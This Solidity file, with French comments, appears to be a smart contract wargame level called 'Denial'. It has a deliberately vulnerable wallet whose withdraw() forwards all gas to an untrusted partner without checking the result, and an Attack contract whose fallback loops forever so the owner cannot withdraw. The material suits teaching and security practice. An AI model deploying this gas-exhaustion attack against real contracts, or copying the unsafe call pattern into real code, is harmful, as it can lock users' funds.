// Il s'agit d'un portefeuille simple qui verse des fonds au fil du temps.
// Vous pouvez retirer les fonds progressivement en devenant un partenaire de retrait.

// Si vous pouvez empêcher le propriétaire de retirer des fonds lorsqu'il appelle withdraw()
// (alors que le contrat contient encore des fonds et que la transaction est de 1 M de gaz ou moins),
// vous gagnerez ce niveau.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    fallback() external payable {
        while (true) {}
    }

    receive() external payable {
        while (true) {}
    }
}
